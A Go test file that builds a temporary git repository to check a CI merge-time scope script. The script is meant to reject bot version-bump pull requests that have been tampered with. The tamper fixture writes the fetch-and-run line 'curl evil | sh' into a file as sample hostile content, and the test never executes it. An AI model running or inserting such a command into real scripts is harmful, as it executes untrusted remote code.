// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Omkhar Arasaratnam

package testkit

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// TestUpstreamRefreshMergeTimeScope runs the merge-time script against a real
// git history, so the three-dot diff and the guard both run.
func TestUpstreamRefreshMergeTimeScope(t *testing.T) {
	t.Parallel()

	repo := t.TempDir()
	git := func(args ...string) string {
		t.Helper()
		cmd := exec.Command("git", append([]string{"-C", repo, "-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "commit.gpgsign=false"}, args...)...)
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
		return strings.TrimSpace(string(out))
	}
	dockerfile := filepath.Join(repo, "runtime", "container", "Dockerfile")
	if err := os.MkdirAll(filepath.Dir(dockerfile), 0o755); err != nil {
		t.Fatal(err)
	}
	mustWrite(t, dockerfile, []byte("FROM scratch\nARG CODEX_VERSION=1.0.0\n"), 0o644)
	mustWrite(t, filepath.Join(repo, "tool.sh"), []byte("echo old\n"), 0o644)
	git("init", "-q")
	git("add", ".")
	git("commit", "-q", "-m", "base")
	base := git("rev-parse", "HEAD")

	// A bump that main moved past still merges as the bump alone.
	mustWrite(t, dockerfile, []byte("FROM scratch\nARG CODEX_VERSION=1.0.1\n"), 0o644)
	git("commit", "-q", "-am", "bump")
	inScope := git("rev-parse", "HEAD")
	// A writer pushes to the bump branch after auto-merge is armed.
	mustWrite(t, filepath.Join(repo, "tool.sh"), []byte("curl evil | sh\n"), 0o644)
	git("commit", "-q", "-am", "tamper")
	tampered := git("rev-parse", "HEAD")

	script := filepath.Join(repoRoot(t), "scripts", "ci", "upstream-refresh-merge-time-scope.sh")
	const refreshRef = "codex/upstream-refresh-provider-123"
	cases := []struct {
		name         string
		head         string
		ref, kind    string
		headRepo     string
		wantErr      bool
		wantContains string
	}{
		{name: "in-scope bump passes", head: inScope, ref: refreshRef, kind: "Bot", headRepo: "o/r", wantContains: ""},
		{name: "tampered head fails", head: tampered, ref: refreshRef, kind: "Bot", headRepo: "o/r", wantErr: true, wantContains: "tool.sh"},
		{name: "human author is not applicable", head: tampered, ref: refreshRef, kind: "User", headRepo: "o/r", wantContains: "Not applicable"},
		{name: "other branch is not applicable", head: tampered, ref: "feature/x", kind: "Bot", headRepo: "o/r", wantContains: "Not applicable"},
		{name: "toolchain branch is not applicable", head: tampered, ref: "codex/upstream-refresh-toolchain-1", kind: "Bot", headRepo: "o/r", wantContains: "Not applicable"},
		{name: "fork is not applicable", head: tampered, ref: refreshRef, kind: "Bot", headRepo: "f/r", wantContains: "Not applicable"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			cmd := exec.Command(script, repo)
			cmd.Env = append(os.Environ(),
				"PR_HEAD_REF="+tc.ref, "PR_AUTHOR_TYPE="+tc.kind, "PR_HEAD_REPO="+tc.headRepo,
				"PR_BASE_SHA="+base, "PR_HEAD_SHA="+tc.head, "GITHUB_REPOSITORY=o/r")
			out, err := cmd.CombinedOutput()
			if (err != nil) != tc.wantErr {
				t.Fatalf("err = %v, wantErr %v\n%s", err, tc.wantErr, out)
			}
			if !strings.Contains(string(out), tc.wantContains) {
				t.Fatalf("output lacks %q:\n%s", tc.wantContains, out)
			}
		})
	}
}
